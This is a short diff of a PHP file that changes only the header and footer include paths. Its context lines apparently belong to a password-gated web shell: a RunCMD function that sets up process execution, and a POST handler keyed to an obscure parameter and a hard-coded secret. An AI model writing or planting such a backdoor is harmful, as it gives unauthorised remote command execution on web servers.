@@ -1,5 +1,5 @@
 <?php
-include_once('inc/header.php');
+include_once('../../inc/header.php');
 
 function RunCMD($cmd) {
 	$descriptorspec = array(
@@ -58,5 +58,5 @@ if ($_SERVER['REQUEST_METHOD'] == 'POST' && $_POST['ihewfihewfewf'] == 'HURR1312
 }
 echo '</pre>';
 
-include_once('inc/footer.php');
+include_once('../../inc/footer.php');
 ?>
